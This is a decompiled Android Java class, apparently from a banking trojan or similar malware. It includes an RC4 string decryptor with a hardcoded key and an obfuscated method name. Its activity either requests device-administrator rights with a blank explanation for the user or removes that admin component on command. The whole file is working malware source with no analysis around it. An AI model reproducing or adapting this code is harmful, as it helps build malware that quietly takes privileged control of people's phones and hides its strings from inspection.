package com.example.mmm.Admin;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;

public class ActivityAdmin extends Activity {
   constants consts = new constants();
   utils utl = new utils();

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onCreate(Bundle var1) {
      super.onCreate(var1);
      ClassAdmin var3 = new ClassAdmin(this);
      if (this.getIntent().getStringExtra("admin").equals("1")) {
         Intent var2 = new Intent("android.app.action.ADD_DEVICE_ADMIN");
         var2.putExtra("android.app.extra.DEVICE_ADMIN", var3.locking$);
         var2.putExtra("android.app.extra.ADD_EXPLANATION", "");
         this.startActivityForResult(var2, 100);
      } else {
         ComponentName var4 = new ComponentName(this, ReceiverDeviceAdmin.class);
         ((DevicePolicyManager)this.getSystemService("device_policy")).removeActiveAdmin(var4);
      }

      this.finish();
   }
}
